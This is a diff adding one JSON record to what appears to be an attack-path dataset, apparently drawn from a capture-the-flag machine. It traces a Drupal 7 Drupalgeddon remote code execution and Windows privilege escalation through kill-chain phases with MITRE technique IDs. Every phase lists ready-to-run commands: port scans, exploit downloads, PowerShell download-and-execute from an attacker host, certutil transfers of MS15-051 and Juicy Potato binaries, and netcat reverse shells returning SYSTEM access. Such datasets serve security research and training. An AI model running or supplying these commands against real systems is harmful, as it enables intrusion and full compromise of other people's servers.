@@ -1,0 +1,167 @@
+{
+  "id": "ap-0031",
+  "title": "Drupal RCE and Privilege Escalation via MS15-051 or Juicy Potato",
+  "summary": "Initial compromise of a Windows server running Drupal 7 via Remote Code Execution (RCE) using Drupalgeddon exploits, followed by internal vulnerability enumeration using Sherlock and final privilege escalation via a kernel exploit (MS15-051) or abuse of SeImpersonate (Juicy Potato).",
+  "attack_path_markdown": "### Step 1\nReconnaissance and identification of Drupal 7 on a Windows machine.\n### Step 2\nExploitation of Drupal RCE vulnerability (Drupalgeddon) to gain command execution or an administrative session.\n### Step 3\nEstablishment of a reverse shell and internal enumeration using Sherlock to discover kernel exploits.\n### Step 4\nExploitation of identified kernel vulnerability (MS15-051) or a token abuse exploit (Juicy Potato) to achieve NT AUTHORITY\\SYSTEM privileges.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target operating system (Windows via TTL 127), open ports, and web application technology (Drupal 7).",
+      "actions": [
+        "Confirm host activity and OS using Ping/TTL analysis",
+        "Perform a full TCP port scan for open ports",
+        "Run service, version, and script detection on identified open ports (80, 135, 49154)",
+        "Web application analysis to identify CMS version"
+      ],
+      "tools": ["ping", "nmap", "wadweb"],
+      "techniques": ["Active Scanning", "Service Enumeration", "CMS Identification"],
+      "mitre_ids": ["T1595.001", "T1046", "T1082"],
+      "indicators": ["TTL 127", "Open ports (80, 135, 49154)", "HTTP Generator header revealing Drupal 7"],
+      "preconditions": "Network connectivity to the target IP (10.10.10.9)",
+      "expected_outcome": "Identification of a Windows host running Drupal 7.",
+      "confidence": 0.95,
+      "commands": [
+        "ping 10.10.10.9",
+        "nmap -p- -T5 --open -sS -n -v --min-rate 5000 10.10.10.9 -oG total_scan_grepable",
+        "nmap -sV -sC -p 80,135,49154 10.10.10.9 -oN total_scan_nmap",
+        "wadweb 10.10.10.9"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Searching for and preparing exploits for Drupal 7 (Drupalgeddon vulnerabilities) and preparing a reverse shell payload.",
+      "actions": [
+        "Search for known exploits for Drupal 7.x",
+        "Acquire and configure Drupal RCE exploit scripts (PHP, Ruby, Python)",
+        "Prepare a PowerShell reverse shell script ('pc.ps1' or similar function definitions)"
+      ],
+      "tools": ["searchsploit", "Drupal Exploit PHP Script", "Drupalgeddon 2 Ruby Script", "PowerShell script"],
+      "techniques": ["Exploit Research", "Staged Payload Delivery"],
+      "mitre_ids": ["T1588.002", "T1071.001"],
+      "indicators": ["Multiple Drupal RCE exploits acquired"],
+      "preconditions": "Drupal 7.x vulnerability confirmed",
+      "expected_outcome": "Exploit ready for execution to gain command injection.",
+      "confidence": 0.9,
+      "commands": [
+        "searchsploit drupal 7.x",
+        "git clone https://github.com/dreadlocked/Drupalgeddon2.git",
+        "git clone https://github.com/dreadlocked/Drupalgeddon3.git"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Executing the RCE exploit to achieve initial command execution and download a persistent shell.",
+      "actions": [
+        "Execute the PHP exploit to leverage SQL injection and file upload capabilities",
+        "Use the RCE capability to download and execute the PowerShell reverse shell payload from the attacker's HTTP server"
+      ],
+      "tools": ["php", "ruby", "PowerShell (IEX)", "python3", "certutil.exe"],
+      "techniques": ["Web Application Injection", "In-Memory Shell Execution", "T1190"],
+      "mitre_ids": ["T1190", "T1059.001", "T1218"],
+      "indicators": ["Successful RCE output validation (e.g., 'whoami' command execution)", "HTTP GET request for the PowerShell script"],
+      "preconditions": "Exploit script configured with target URL and attacker IP/Port",
+      "expected_outcome": "Low-privileged shell session established on the victim machine.",
+      "confidence": 0.95,
+      "commands": [
+        "php drupal_exploit.php",
+        "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.29/pc.ps1')"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Receiving and establishing the interactive shell session.",
+      "actions": [
+        "Set up a local handler to receive the reverse shell",
+        "Receive the connection, confirming the initial foothold"
+      ],
+      "tools": ["netcat", "rlwrap"],
+      "techniques": ["Reverse Shell", "C2 Channel Establishment"],
+      "mitre_ids": ["T1059.001", "T1105"],
+      "indicators": ["Successful netcat connection received", "Initial user flag (`user.txt`) located"],
+      "preconditions": "Payload successfully executed on the target",
+      "expected_outcome": "Interactive shell session as a low-privileged user.",
+      "confidence": 1.0,
+      "commands": [
+        "rlwrap nc -lvnp 443"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Internal enumeration using Sherlock to find potential paths for privilege escalation, confirming kernel vulnerabilities or token abuse privileges.",
+      "actions": [
+        "System enumeration using Sherlock.ps1 to check for kernel vulnerabilities",
+        "Identify system privileges for potential abuse (e.g., SeImpersonatePrivilege)"
+      ],
+      "tools": ["Sherlock.ps1", "whoami /priv"],
+      "techniques": ["System Information Discovery", "Vulnerability Scanning", "Privilege Identification"],
+      "mitre_ids": ["T1082", "T1049"],
+      "indicators": ["Sherlock output flagging MS15-051 as vulnerable", "Presence of SeImpersonate privilege"],
+      "preconditions": "Shell access established",
+      "expected_outcome": "Identification of MS15-051 kernel exploit path or Juicy Potato / Rotten Potato path.",
+      "confidence": 0.9,
+      "commands": [
+        "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.29/sherlock.ps1')",
+        "Find-All-Vulnerabilities"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Transferring necessary privilege escalation tools (MS15-051 binary, Juicy Potato, and Netcat binary) to the target machine.",
+      "actions": [
+        "Download the MS15-051 exploit binary to a temporary directory",
+        "Download the Juicy Potato binary to the same directory",
+        "Download a Windows Netcat binary to be used in conjunction with the exploits"
+      ],
+      "tools": ["MS15-051.exe (or 64-bit version)", "JuicyPotato.exe", "netcat.exe", "certutil.exe"],
+      "techniques": ["Ingress Tool Transfer", "Command Line Execution"],
+      "mitre_ids": ["T1105"],
+      "indicators": ["Successful file transfer using certutil"],
+      "preconditions": "Vulnerability confirmed; exploit binaries obtained and hosted by the attacker.",
+      "expected_outcome": "PE exploits available for execution in C:\\Windows\\Temp\\prives\\.",
+      "confidence": 0.95,
+      "commands": [
+        "certutil -urlcache -f http://10.10.14.29/MS15-051_x64.exe C:\\Windows\\Temp\\prives\\MS15-051.exe",
+        "certutil -urlcache -f http://10.10.14.29/JuicyPotato.exe C:\\Windows\\Temp\\prives\\JuicyPotato.exe",
+        "certutil -urlcache -f http://10.10.14.29/nc.exe C:\\Windows\\Temp\\prives\\nc.exe"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Executing the exploit (MS15-051 or Juicy Potato) to achieve NT AUTHORITY\\SYSTEM privileges and retrieving the final flag.",
+      "actions": [
+        "Execute the kernel exploit to confirm SYSTEM privileges or launch a privileged reverse shell",
+        "Alternatively, execute Juicy Potato using a valid CLSID to trigger a privileged command execution",
+        "Locate and read the root flag"
+      ],
+      "tools": ["MS15-051.exe", "JuicyPotato.exe", "netcat"],
+      "techniques": ["Kernel Exploit", "Exploiting Privileged Services (Potato)", "Accessing system credentials"],
+      "mitre_ids": ["T1068", "T1547.005", "T1003"],
+      "indicators": ["Command output showing 'NT AUTHORITY\\SYSTEM'", "Root flag (`root.txt`) contents obtained"],
+      "preconditions": "PE binary available and attacker netcat listener running on the designated port (e.g., 4647).",
+      "expected_outcome": "Full compromise of the system.",
+      "confidence": 1.0,
+      "commands": [
+        "MS15-051.exe whoami",
+        "MS15-051.exe \"C:\\Windows\\Temp\\prives\\nc.exe -e cmd.exe 10.10.14.29 4647\"",
+        "JuicyPotato.exe -t * -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Windows\\Temp\\prives\\nc.exe -e cmd.exe 10.10.14.29 4647\" -c {CLSID_FROM_WINDOWS_8.1_OR_2008_R2}",
+        "type C:\\Users\\Administrator\\Desktop\\root.txt"
+      ]
+    }
+  ],
+  "tactics": ["Initial Access", "Execution", "Privilege Escalation", "Defense Evasion", "Credential Access"],
+  "techniques": ["Remote Code Execution", "Insecure Configuration", "Kernel Exploitation", "Exploiting Privileged Services"],
+  "mitre_ids": ["T1190", "T1059.003", "T1068", "T1547.005"],
+  "hosts": ["10.10.10.9"],
+  "privs_obtained": ["low-privileged user", "NT AUTHORITY\\SYSTEM"],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "The primary paths identified were Drupal RCE (via various exploits) and Privilege Escalation via MS15-051 kernel exploit or Juicy Potato token abuse, leveraged after confirming SeImpersonatePrivilege.",
+  "labels": ["rce", "drupal", "windows", "kernel_exploit", "juicy_potato"]
+}
